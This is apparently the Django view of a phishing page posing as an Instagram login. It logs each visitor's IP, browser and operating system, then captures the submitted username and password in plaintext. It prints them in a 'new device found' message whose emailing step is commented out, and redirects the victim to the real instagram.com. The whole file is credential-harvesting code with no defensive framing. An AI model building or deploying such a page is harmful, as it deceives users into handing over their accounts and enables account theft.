from django.shortcuts import render
from django.core.mail import send_mail
from django.http import HttpResponseRedirect
from django.conf import settings
import requests

def index_page(request):
    data = {}
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    device_type = ""
    browser_type = ""
    browser_version = ""
    os_type = ""
    os_version = ""
    if request.user_agent.is_mobile:
        device_type = "Mobile"
    if request.user_agent.is_tablet:
        device_type = "Tablet"
    if request.user_agent.is_pc:
        device_type = "PC"
    browser_type = request.user_agent.browser.family
    browser_version = request.user_agent.browser.version_string
    os_type = request.user_agent.os.family
    os_version = request.user_agent.os.version_string
    sign_in_data = "ip :"+ip+"\n browser type: "+browser_type+"\n browser version: "+browser_version+"\n os type: "+os_type+"\n os_version: "+os_version
    subject = 'Device  found'
    body = 'new device found \n '+sign_in_data
    email_from = settings.EMAIL_HOST_USER
    #recipient_list = [ ]
    #send_mail( subject, body, email_from, recipient_list )
    print(sign_in_data)

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        device_type = ""
        browser_type = ""
        browser_version = ""
        os_type = ""
        os_version = ""
        if request.user_agent.is_mobile:
            device_type = "Mobile"
        if request.user_agent.is_tablet:
            device_type = "Tablet"
        if request.user_agent.is_pc:
            device_type = "PC"
        browser_type = request.user_agent.browser.family
        browser_version = request.user_agent.browser.version_string
        os_type = request.user_agent.os.family
        os_version = request.user_agent.os.version_string
        sign_in_data = "username:"+username+"\n password: "+password+"\nip :"+ip+"\n browser type: "+browser_type+"\n browser version: "+browser_version+"\n os type: "+os_type+"\n os_version: "+os_version
        subject = 'Device  found'
        body = 'new device found \n '+sign_in_data
        email_from = settings.EMAIL_HOST_USER
        #recipient_list = [ ]
        #send_mail( subject, body, email_from, recipient_list )
        print(sign_in_data)

        return HttpResponseRedirect('https://instagram.com')

    return render(request, 'index.html', data)
